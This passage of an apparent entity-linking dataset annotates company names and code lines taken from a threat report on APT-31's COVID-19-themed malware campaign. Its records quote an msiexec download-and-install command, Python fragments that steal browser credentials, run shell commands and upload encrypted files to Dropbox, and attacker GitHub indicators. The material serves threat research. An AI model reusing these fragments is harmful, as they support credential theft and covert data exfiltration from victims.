"https://en.wikipedia.org/wiki?curid=18545292", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "GitHub", "context_left": "*C:\\Windows\\System32\\msiexec.exe  /q /i <github\\_URL>* It is worth noting that in 2019, this actor used a fake file extension (*.png) for the MSI binary hosted on the attacker-controlled", "context_right": "account. Based on this similarity, we are confident that a first-stage payload was involved that downloads and executes the MSI files.", "_context_left": "It is worth noting that in 2019, this actor used a fake file extension (*.png) for the MSI binary hosted on the attacker-controlled ", "_context_right": " account.", "sentence_left": "*C:\\Windows\\System32\\msiexec.exe  /q /i <github\\_URL>*", "sentence_right": "Based on this similarity, we are confident that a first-stage payload was involved that downloads and executes the MSI files.", "label": "GitHub is an American company that provides hosting for software development version control using Git. It is a subsidiary of Microsoft, which acquired the company in 2018 for $7.5 billion. It offers all of the distributed version control and source code management (SCM) functionality of Git as well as adding its own features. It provides access control and several collaboration features such as bug tracking, feature requests, task management, and wikis for every project.  GitHub offers plans for free, professional, and enterprise accounts. Free GitHub accounts are commonly used to host open source projects. As of January 2019, GitHub offers unlimited private repositories to all plans, including free accounts. As of May 2019, GitHub reports having over 37 million users and more than 100 million repositories (including at least 28 million public repositories), making it the largest host of source code in the world.", "label_id": 2294705, "label_title": "GitHub", "label_link": "https://en.wikipedia.org/wiki?curid=18545292", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Microsoft", "context_left": "**Filename**: OneDrive.exe For the purpose of social engineering, the threat actor chose file names related to legitimate online services, including", "context_right": "OneDrive. In a few instances, we observed the use of file names resembling McAfee’s endpoint security product.", "_context_left": "For the purpose of social engineering, the threat actor chose file names related to legitimate online services, including ", "_context_right": " OneDrive.", "sentence_left": "**Filename**: OneDrive.exe", "sentence_right": "In a few instances, we observed the use of file names resembling McAfee’s endpoint security product.", "label": "Microsoft Corporation is an American multinational technology company with headquarters in Redmond, Washington. It develops, manufactures, licenses, supports and sells computer software, consumer electronics, personal computers, and related services. Its best known software products are the Microsoft Windows line of operating systems, the Microsoft Office suite, and the Internet Explorer and Edge Web browsers. Its flagship hardware products are the Xbox video game consoles and the Microsoft Surface lineup of touchscreen personal computers. As of 2016, it is the world's largest software maker by revenue, and one of the world's most valuable companies. The word \"Microsoft\" is a portmanteau of \"microcomputer\" and \"software\". Microsoft is ranked No. 30 in the 2018 Fortune 500 rankings of the largest United States corporations by total revenue.  Microsoft was founded by Bill Gates and Paul Allen on April 4, 1975, to develop and sell BASIC interpreters for the Altair 8800. It rose to dominate the personal computer operating system market with MS-DOS in the mid-1980s, followed by Microsoft Windows. The company's 1986 initial public offering (IPO), and subsequent rise in its share price, created three billionaires and an estimated 12,000 millionaires among Microsoft employees. Since the 1990s, it has increasingly diversified from the operating system market and has made a number of corporate acquisitions, their largest being the acquisition of LinkedIn for $26.2 billion in December 2016, followed by their acquisition of Skype Technologies for $8.5 billion in May 2011.  , Microsoft is market-dominant in the IBM PC compatible operating system market and the office software suite", "label_id": 9231, "label_title": "Microsoft", "label_link": "https://en.wikipedia.org/wiki?curid=19001", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "McAfee", "context_left": "For the purpose of social engineering, the threat actor chose file names related to legitimate online services, including Microsoft OneDrive. In a few instances, we observed the use of file names resembling", "context_right": "’s endpoint security product. Even the file icons for these binaries are selected to masquerade as the corresponding legitimate applications.", "_context_left": "In a few instances, we observed the use of file names resembling ", "_context_right": "’s endpoint security product.", "sentence_left": "For the purpose of social engineering, the threat actor chose file names related to legitimate online services, including Microsoft OneDrive.", "sentence_right": "Even the file icons for these binaries are selected to masquerade as the corresponding legitimate applications.", "label": "McAfee, LLC (; formerly known as McAfee Associates, Inc. in 1987–2014 and Intel Security Group in 2014–2017) is an American global computer security software company headquartered in Santa Clara, California and claims to be the world's largest dedicated security technology company.  The company was purchased by Intel in February 2011, and became part of the Intel Security division.  On September 7, 2016, Intel announced a strategic deal with TPG Capital to convert Intel Security into a joint venture between both companies called McAfee. That deal closed on April 3, 2017. Thoma Bravo took a minority stake in the new company, and Intel maintains a 49% stake.", "label_id": 106626, "label_title": "McAfee", "label_link": "https://en.wikipedia.org/wiki?curid=198684", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Microsoft", "context_left": "Later this proxy server is used for all the C&C communication. **2.Browser credential stealing**: Capability to steal credentials (username and password) from the installed browsers,", "context_right": "Internet Explorer (MSIE), and Google Chrome browser. Figures 7 and 8 show the code sections responsible for stealing the credentials from MSIE and Chrome browser respectively.", "_context_left": "**2.Browser credential stealing**: Capability to steal credentials (username and password) from the installed browsers, ", "_context_right": " Internet Explorer (MSIE), and Google Chrome browser.", "sentence_left": "Later this proxy server is used for all the C&C communication.", "sentence_right": "Figures 7 and 8 show the code sections responsible for stealing the credentials from MSIE and Chrome browser respectively.", "label": "Microsoft Corporation is an American multinational technology company with headquarters in Redmond, Washington. It develops, manufactures, licenses, supports and sells computer software, consumer electronics, personal computers, and related services. Its best known software products are the Microsoft Windows line of operating systems, the Microsoft Office suite, and the Internet Explorer and Edge Web browsers. Its flagship hardware products are the Xbox video game consoles and the Microsoft Surface lineup of touchscreen personal computers. As of 2016, it is the world's largest software maker by revenue, and one of the world's most valuable companies. The word \"Microsoft\" is a portmanteau of \"microcomputer\" and \"software\". Microsoft is ranked No. 30 in the 2018 Fortune 500 rankings of the largest United States corporations by total revenue.  Microsoft was founded by Bill Gates and Paul Allen on April 4, 1975, to develop and sell BASIC interpreters for the Altair 8800. It rose to dominate the personal computer operating system market with MS-DOS in the mid-1980s, followed by Microsoft Windows. The company's 1986 initial public offering (IPO), and subsequent rise in its share price, created three billionaires and an estimated 12,000 millionaires among Microsoft employees. Since the 1990s, it has increasingly diversified from the operating system market and has made a number of corporate acquisitions, their largest being the acquisition of LinkedIn for $26.2 billion in December 2016, followed by their acquisition of Skype Technologies for $8.5 billion in May 2011.  , Microsoft is market-dominant in the IBM PC compatible operating system market and the office software suite", "label_id": 9231, "label_title": "Microsoft", "label_link": "https://en.wikipedia.org/wiki?curid=19001", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Google", "context_left": "Later this proxy server is used for all the C&C communication. **2.Browser credential stealing**: Capability to steal credentials (username and password) from the installed browsers, Microsoft Internet Explorer (MSIE), and", "context_right": "Chrome browser. Figures 7 and 8 show the code sections responsible for stealing the credentials from MSIE and Chrome browser respectively.", "_context_left": "**2.Browser credential stealing**: Capability to steal credentials (username and password) from the installed browsers, Microsoft Internet Explorer (MSIE), and ", "_context_right": " Chrome browser.", "sentence_left": "Later this proxy server is used for all the C&C communication.", "sentence_right": "Figures 7 and 8 show the code sections responsible for stealing the credentials from MSIE and Chrome browser respectively.", "label": "Google LLC is an American multinational technology company that specializes in Internet-related services and products, which include online advertising technologies, search engine, cloud computing, software, and hardware. It is considered one of the Big Four technology companies, alongside Amazon, Apple and Facebook.  Google was founded in 1998 by Larry Page and Sergey Brin while they were Ph.D. students at Stanford University in California. Together they own about 14 percent of its shares and control 56 percent of the stockholder voting power through supervoting stock. They incorporated Google as a privately held company on September 4, 1998. An initial public offering (IPO) took place on August 19, 2004, and Google moved to its headquarters in Mountain View, California, nicknamed the Googleplex. In August 2015, Google announced plans to reorganize its various interests as a conglomerate called Alphabet Inc. Google is Alphabet's leading subsidiary and will continue to be the umbrella company for Alphabet's Internet interests. Sundar Pichai was appointed CEO of Google, replacing Larry Page who became the CEO of Alphabet.  The company's rapid growth since incorporation has triggered a chain of products, acquisitions, and partnerships beyond Google's core search engine (Google Search). It offers services designed for work and productivity (Google Docs, Google Sheets, and Google Slides), email (Gmail/Inbox), scheduling and time management (Google Calendar), cloud storage (Google Drive), instant messaging and video chat (Google Allo, Duo, Hangouts), language translation (Google Translate), mapping and navigation (Google Maps, Waze, Google Earth, Street View), video sharing (YouTube), note-taking (Google Keep), and photo organizing and editing", "label_id": 348100, "label_title": "Google", "label_link": "https://en.wikipedia.org/wiki?curid=1092923", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Zscaler", "context_left": "The filename format used is: back#<unique\\_id>#<job\\_id>#.txt ### **", "context_right": "Cloud Sandbox detection** Figure 9 shows the sandbox detection for the final payload which is a Python-compiled binary.", "_context_left": "### **", "_context_right": " Cloud Sandbox detection**", "sentence_left": "The filename format used is: back#<unique\\_id>#<job\\_id>#.txt", "sentence_right": "Figure 9 shows the sandbox detection for the final payload which is a Python-compiled binary.", "label": "Zscaler ((US English)) is a cloud security company, with headquarters in San Jose, California. It offers a platform for businesses that move their data to the cloud, with employees who work remotely.", "label_id": 5903536, "label_title": "Zscaler", "label_link": "https://en.wikipedia.org/wiki?curid=65138718", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Zscaler", "context_left": "![sandbox_detection](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/sandbox_detection.png) *Figure 9:", "context_right": "Cloud Sandbox detection.* ### **Conclusion**", "_context_left": "*Figure 9: ", "_context_right": " Cloud Sandbox detection.*", "sentence_left": "![sandbox_detection](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/sandbox_detection.png)", "sentence_right": "### **Conclusion**", "label": "Zscaler ((US English)) is a cloud security company, with headquarters in San Jose, California. It offers a platform for businesses that move their data to the cloud, with employees who work remotely.", "label_id": 5903536, "label_title": "Zscaler", "label_link": "https://en.wikipedia.org/wiki?curid=65138718", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "GitHub", "context_left": "The threat actor, APT-31, quickly leverages current themes, such as COVID-19, or political themes of interest to the victim as a social engineering technique to infect their machines. By abusing legitimate services such as", "context_right": ", Google Drive, and Dropbox in the infection chain, end-to-end, this threat actor manages to evade network security solutions. As always, users should be cautious when receiving emails out of the blue, even if those emails appear to be related to something you are interested in, such as information about a COVID-19 vaccine.", "_context_left": "By abusing legitimate services such as ", "_context_right": ", Google Drive, and Dropbox in the infection chain, end-to-end, this threat actor manages to evade network security solutions.", "sentence_left": "The threat actor, APT-31, quickly leverages current themes, such as COVID-19, or political themes of interest to the victim as a social engineering technique to infect their machines.", "sentence_right": "As always, users should be cautious when receiving emails out of the blue, even if those emails appear to be related to something you are interested in, such as information about a COVID-19 vaccine.", "label": "GitHub is an American company that provides hosting for software development version control using Git. It is a subsidiary of Microsoft, which acquired the company in 2018 for $7.5 billion. It offers all of the distributed version control and source code management (SCM) functionality of Git as well as adding its own features. It provides access control and several collaboration features such as bug tracking, feature requests, task management, and wikis for every project.  GitHub offers plans for free, professional, and enterprise accounts. Free GitHub accounts are commonly used to host open source projects. As of January 2019, GitHub offers unlimited private repositories to all plans, including free accounts. As of May 2019, GitHub reports having over 37 million users and more than 100 million repositories (including at least 28 million public repositories), making it the largest host of source code in the world.", "label_id": 2294705, "label_title": "GitHub", "label_link": "https://en.wikipedia.org/wiki?curid=18545292", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Google", "context_left": "The threat actor, APT-31, quickly leverages current themes, such as COVID-19, or political themes of interest to the victim as a social engineering technique to infect their machines. By abusing legitimate services such as GitHub,", "context_right": "Drive, and Dropbox in the infection chain, end-to-end, this threat actor manages to evade network security solutions. As always, users should be cautious when receiving emails out of the blue, even if those emails appear to be related to something you are interested in, such as information about a COVID-19 vaccine.", "_context_left": "By abusing legitimate services such as GitHub, ", "_context_right": " Drive, and Dropbox in the infection chain, end-to-end, this threat actor manages to evade network security solutions.", "sentence_left": "The threat actor, APT-31, quickly leverages current themes, such as COVID-19, or political themes of interest to the victim as a social engineering technique to infect their machines.", "sentence_right": "As always, users should be cautious when receiving emails out of the blue, even if those emails appear to be related to something you are interested in, such as information about a COVID-19 vaccine.", "label": "Google LLC is an American multinational technology company that specializes in Internet-related services and products, which include online advertising technologies, search engine, cloud computing, software, and hardware. It is considered one of the Big Four technology companies, alongside Amazon, Apple and Facebook.  Google was founded in 1998 by Larry Page and Sergey Brin while they were Ph.D. students at Stanford University in California. Together they own about 14 percent of its shares and control 56 percent of the stockholder voting power through supervoting stock. They incorporated Google as a privately held company on September 4, 1998. An initial public offering (IPO) took place on August 19, 2004, and Google moved to its headquarters in Mountain View, California, nicknamed the Googleplex. In August 2015, Google announced plans to reorganize its various interests as a conglomerate called Alphabet Inc. Google is Alphabet's leading subsidiary and will continue to be the umbrella company for Alphabet's Internet interests. Sundar Pichai was appointed CEO of Google, replacing Larry Page who became the CEO of Alphabet.  The company's rapid growth since incorporation has triggered a chain of products, acquisitions, and partnerships beyond Google's core search engine (Google Search). It offers services designed for work and productivity (Google Docs, Google Sheets, and Google Slides), email (Gmail/Inbox), scheduling and time management (Google Calendar), cloud storage (Google Drive), instant messaging and video chat (Google Allo, Duo, Hangouts), language translation (Google Translate), mapping and navigation (Google Maps, Waze, Google Earth, Street View), video sharing (YouTube), note-taking (Google Keep), and photo organizing and editing", "label_id": 348100, "label_title": "Google", "label_link": "https://en.wikipedia.org/wiki?curid=1092923", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Zscaler", "context_left": "As always, users should be cautious when receiving emails out of the blue, even if those emails appear to be related to something you are interested in, such as information about a COVID-19 vaccine. The", "context_right": "ThreatLabZ team will continue to monitor this campaign, as well as others, to help keep our customers safe. ### **MITRE ATT&CK table**", "_context_left": "The ", "_context_right": " ThreatLabZ team will continue to monitor this campaign, as well as others, to help keep our customers safe.", "sentence_left": "As always, users should be cautious when receiving emails out of the blue, even if those emails appear to be related to something you are interested in, such as information about a COVID-19 vaccine.", "sentence_right": "### **MITRE ATT&CK table**", "label": "Zscaler ((US English)) is a cloud security company, with headquarters in San Jose, California. It offers a platform for businesses that move their data to the cloud, with employees who work remotely.", "label_id": 5903536, "label_title": "Zscaler", "label_link": "https://en.wikipedia.org/wiki?curid=65138718", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Github", "context_left": "**Network-based indicators** **", "context_right": "URL hosting MSI file:** hxxps://github.com/**yandexmcf1**/rnicrosoft/raw/974aaa531eeb301762e486c3a120103f09a3b194/PAPER-COVID-19-Vaccine-Strategy.pdf", "_context_left": "**", "_context_right": " URL hosting MSI file:**", "sentence_left": "**Network-based indicators**", "sentence_right": "hxxps://github.com/**yandexmcf1**/rnicrosoft/raw/974aaa531eeb301762e486c3a120103f09a3b194/PAPER-COVID-19-Vaccine-Strategy.pdf", "label": "GitHub is an American company that provides hosting for software development version control using Git. It is a subsidiary of Microsoft, which acquired the company in 2018 for $7.5 billion. It offers all of the distributed version control and source code management (SCM) functionality of Git as well as adding its own features. It provides access control and several collaboration features such as bug tracking, feature requests, task management, and wikis for every project.  GitHub offers plans for free, professional, and enterprise accounts. Free GitHub accounts are commonly used to host open source projects. As of January 2019, GitHub offers unlimited private repositories to all plans, including free accounts. As of May 2019, GitHub reports having over 37 million users and more than 100 million repositories (including at least 28 million public repositories), making it the largest host of source code in the world.", "label_id": 2294705, "label_title": "GitHub", "label_link": "https://en.wikipedia.org/wiki?curid=18545292", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Github", "context_left": "hxxps://raw.githubusercontent.com/**protonshshll**/run/master/siHost64.png **Attacker-controlled", "context_right": "account names:** yandexmcf1", "_context_left": "**Attacker-controlled ", "_context_right": " account names:**", "sentence_left": "hxxps://raw.githubusercontent.com/**protonshshll**/run/master/siHost64.png", "sentence_right": "yandexmcf1", "label": "GitHub is an American company that provides hosting for software development version control using Git. It is a subsidiary of Microsoft, which acquired the company in 2018 for $7.5 billion. It offers all of the distributed version control and source code management (SCM) functionality of Git as well as adding its own features. It provides access control and several collaboration features such as bug tracking, feature requests, task management, and wikis for every project.  GitHub offers plans for free, professional, and enterprise accounts. Free GitHub accounts are commonly used to host open source projects. As of January 2019, GitHub offers unlimited private repositories to all plans, including free accounts. As of May 2019, GitHub reports having over 37 million users and more than 100 million repositories (including at least 28 million public repositories), making it the largest host of source code in the world.", "label_id": 2294705, "label_title": "GitHub", "label_link": "https://en.wikipedia.org/wiki?curid=18545292", "entity_class": "NE", "entity_type": "ORG", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "return os.environ.get('COMPUTERNAME')", "context_left": "def getComputername():", "context_right": "def getSysinfo():", "_context_left": "", "_context_right": "", "sentence_left": "def getComputername():", "sentence_right": "def getSysinfo():", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "else:", "context_left": "server = i.split('=')[1]", "context_right": "server = ''", "_context_left": "", "_context_right": "", "sentence_left": "server = i.split('=')[1]", "sentence_right": "server = ''", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "for userdic in creds:", "context_left": "if creds:", "context_right": "for user in userdic:", "_context_left": "", "_context_right": "", "sentence_left": "if creds:", "sentence_right": "for user in userdic:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "| T1082 | System Information Discovery | Sends processor architecture and computer name |", "context_left": "| T1555.003 | Credentials from Web Browsers | Steals credentials from Explorer and Chrome browser |", "context_right": "| T1083 | File and Directory Discovery | Upload file from the victim machine |", "_context_left": "", "_context_right": "", "sentence_left": "| T1555.003 | Credentials from Web Browsers | Steals credentials from Explorer and Chrome browser |", "sentence_right": "| T1083 | File and Directory Discovery | Upload file from the victim machine |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "With an MSI Wrapper, you can include other files in the same MSI package and execute them along with the main executable.", "context_left": "All the MSI files were created using [MSI Wrapper](https://www.exemsi.com) software, which helps to convert an executable file to an MSI file.", "context_right": "Figure 6 shows the MSI Wrapper flash screen displayed to the user upon execution.", "_context_left": "", "_context_right": "", "sentence_left": "All the MSI files were created using [MSI Wrapper](https://www.exemsi.com) software, which helps to convert an executable file to an MSI file.", "sentence_right": "Figure 6 shows the MSI Wrapper flash screen displayed to the user upon execution.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "class Download(threading.Thread):", "context_left": "return r", "context_right": "def \\_\\_init\\_\\_(self, jobid, filepath, proxy):", "_context_left": "", "_context_right": "", "sentence_left": "return r", "sentence_right": "def \\_\\_init\\_\\_(self, jobid, filepath, proxy):", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "respath = '/res'", "context_left": "content\\_url = 'https://content.dropboxapi.com/2/files/'", "context_right": "jobpath = '/job'", "_context_left": "", "_context_right": "", "sentence_left": "content\\_url = 'https://content.dropboxapi.com/2/files/'", "sentence_right": "jobpath = '/job'", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)", "context_left": "BS = 16", "context_right": "unpad = lambda s: s[0:-ord(s[(-1)])]", "_context_left": "", "_context_right": "", "sentence_left": "BS = 16", "sentence_right": "unpad = lambda s: s[0:-ord(s[(-1)])]", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "try:", "context_left": "def run(self):", "context_right": "proc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)", "_context_left": "", "_context_right": "", "sentence_left": "def run(self):", "sentence_right": "proc = subprocess.Popen(self.command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "The threat actor in this case leverages legitimate online services end-to-end in the infection chain in order to blend in with benign traffic and evade network security controls.", "context_left": "### **Distribution strategy**", "context_right": "The infection chain starts with an email in which the victim receives a download link that fetches the first-stage downloader.", "_context_left": "", "_context_right": "", "sentence_left": "### **Distribution strategy**", "sentence_right": "The infection chain starts with an email in which the victim receives a download link that fetches the first-stage downloader.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "return isproxy", "context_left": "CloseKey(aKey)", "context_right": "except Exception as e:", "_context_left": "", "_context_right": "", "sentence_left": "CloseKey(aKey)", "sentence_right": "except Exception as e:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "yandexmcf1", "context_left": "**Attacker-controlled Github account names:**", "context_right": "protonshshll", "_context_left": "", "_context_right": "", "sentence_left": "**Attacker-controlled Github account names:**", "sentence_right": "protonshshll", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "except Exception as e:", "context_left": "time.sleep(10)", "context_right": "time.sleep(10)", "_context_left": "", "_context_right": "", "sentence_left": "time.sleep(10)", "sentence_right": "time.sleep(10)", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "except Exception as e:", "context_left": "i += 1", "context_right": "pass", "_context_left": "", "_context_right": "", "sentence_left": "i += 1", "sentence_right": "pass", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "passwd = i['CredentialBlob'].replace('\\x00', '')", "context_left": "user = i['UserName']", "context_right": "dic = {user: passwd}", "_context_left": "", "_context_right": "", "sentence_left": "user = i['UserName']", "sentence_right": "dic = {user: passwd}", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "threading.Thread.\\_\\_init\\_\\_(self)", "context_left": "def \\_\\_init\\_\\_(self, jobid, dest, attachment, proxy):", "context_right": "self.jobid = jobid", "_context_left": "", "_context_right": "", "sentence_left": "def \\_\\_init\\_\\_(self, jobid, dest, attachment, proxy):", "sentence_right": "self.jobid = jobid", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "**MAC Vendor**: VMWARE", "context_left": "**MAC Address**: 00:0c:29:51:de:79", "context_right": "Creation: 2019-10-29 02:05:30", "_context_left": "", "_context_right": "", "sentence_left": "**MAC Address**: 00:0c:29:51:de:79", "sentence_right": "Creation: 2019-10-29 02:05:30", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "If successful then the proxy server information is obtained using the registry value “ProxyServer” under the same registry key.", "context_left": "**1.Check and use the proxy configuration:** Check if the proxy is configured using registry value “ProxyEnable” which is located under registry key “Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings”.", "context_right": "Later this proxy server is used for all the C&C communication.", "_context_left": "", "_context_right": "", "sentence_left": "**1.Check and use the proxy configuration:** Check if the proxy is configured using registry value “ProxyEnable” which is located under registry key “Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings”.", "sentence_right": "Later this proxy server is used for all the C&C communication.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "Later this proxy server is used for all the C&C communication.", "context_left": "If successful then the proxy server information is obtained using the registry value “ProxyServer” under the same registry key.", "context_right": "**2.Browser credential stealing**: Capability to steal credentials (username and password) from the installed browsers, Microsoft Internet Explorer (MSIE), and Google Chrome browser.", "_context_left": "", "_context_right": "", "sentence_left": "If successful then the proxy server information is obtained using the registry value “ProxyServer” under the same registry key.", "sentence_right": "**2.Browser credential stealing**: Capability to steal credentials (username and password) from the installed browsers, Microsoft Internet Explorer (MSIE), and Google Chrome browser.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "![Attack_Flow](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/APT_31/attack_flow2.001.jpeg)", "context_left": "Figure 1 shows the entire reconstructed attack flow.", "context_right": "*Figure 1: Reconstructed entire attack flow*", "_context_left": "", "_context_right": "", "sentence_left": "Figure 1 shows the entire reconstructed attack flow.", "sentence_right": "*Figure 1: Reconstructed entire attack flow*", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "def get\\_proxyserver():", "context_left": "time.sleep(10)", "context_right": "try:", "_context_left": "", "_context_right": "", "sentence_left": "time.sleep(10)", "sentence_right": "try:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "FINAL\\_\\_-COVID-Vaccine-Letter.pdf", "context_left": "covid\\_19\\_vaccines\\_final.pdf", "context_right": "200709-The-Publics-Role-in-COVID-19-Vaccination.pdf", "_context_left": "", "_context_right": "", "sentence_left": "covid\\_19\\_vaccines\\_final.pdf", "sentence_right": "200709-The-Publics-Role-in-COVID-19-Vaccination.pdf", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "elif '=' in v:", "context_left": "server = ''", "context_right": "server = v.split('=')[1]", "_context_left": "", "_context_right": "", "sentence_left": "server = ''", "sentence_right": "server = v.split('=')[1]", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "delete(respath\\_s + filename, self.proxy)", "context_left": "if search(respath, filename, self.proxy)['matches']:", "context_right": "upload(aesciper.encrypt(file\\_content), respath\\_s + filename, self.proxy)", "_context_left": "", "_context_right": "", "sentence_left": "if search(respath, filename, self.proxy)['matches']:", "sentence_right": "upload(aesciper.encrypt(file\\_content), respath\\_s + filename, self.proxy)", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
{"mention": "mcafee\\_trial\\_setup\\_433.0207.3919\\_key.exe", "context_left": "**Dropped decoy file names**", "context_right": "PAPER-COVID-19-Vaccine-Strategy.pdf", "_context_left": "", "_context_right": "", "sentence_left": "**Dropped decoy file names**", "sentence_right": "PAPER-COVID-19-Vaccine-Strategy.pdf", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "zscaler_2020-10-27_apt-31-leverages-covid-19"}
